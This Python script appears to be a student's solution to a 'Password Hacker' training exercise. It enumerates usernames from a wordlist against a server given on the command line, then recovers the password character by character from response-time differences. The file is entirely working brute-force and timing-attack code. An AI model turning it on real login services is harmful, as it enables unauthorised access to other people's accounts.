# write your code here
import sys
import socket
import json
import string
from datetime import datetime

p = ''


def create_list(name_txt):
    the_list = []
    with open('/Users/alyona/PycharmProjects/Password Hacker/Password Hacker/task/hacking/{}.txt'.format(name_txt), 'r', encoding='utf-8') as f:
        for line in f:
            the_list.append(line.strip())
    return the_list


list_of_logins = create_list('logins')


def create_json_login():
    for login in list_of_logins:
        yield json.dumps({'login': login, 'password': ''})


def create_json_password():
    lower_letters_list = list(string.ascii_lowercase)
    upper_letters_list = list(string.ascii_uppercase)
    numbers_list = list(range(10))
    # the_list needs to be searched from the beginning. But I didn't manage to come with the better solution
    the_list = lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list
    for i in the_list:
        yield json.dumps({'login': the_login, 'password': p + str(i)})


args = sys.argv
hostname = args[1]
port = int(args[2])

with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)
    get_login = create_json_login()

    for j in get_login:
        data = j.encode('utf-8')
        client_socket.send(data)
        response = client_socket.recv(1024)
        response = response.decode('utf-8')
        response = json.loads(response)
        if response == {'result': 'Wrong password!'}:
            result = json.loads(j)
            the_login = result["login"]
            break

    get_password = create_json_password()
    for k in get_password:
        data = k.encode('utf-8')
        client_socket.send(data)
        start = datetime.now()

        response = client_socket.recv(1024)
        response = response.decode('utf-8')
        response = json.loads(response)

        finish = datetime.now()

        difference = finish - start
        difference = difference.microseconds
        if difference >= 100000:
            result = json.loads(k)
            the_password = result["password"]
            p = the_password
        elif response == {"result": "Connection success!"}:
            print(k)
            client_socket.close()
            break
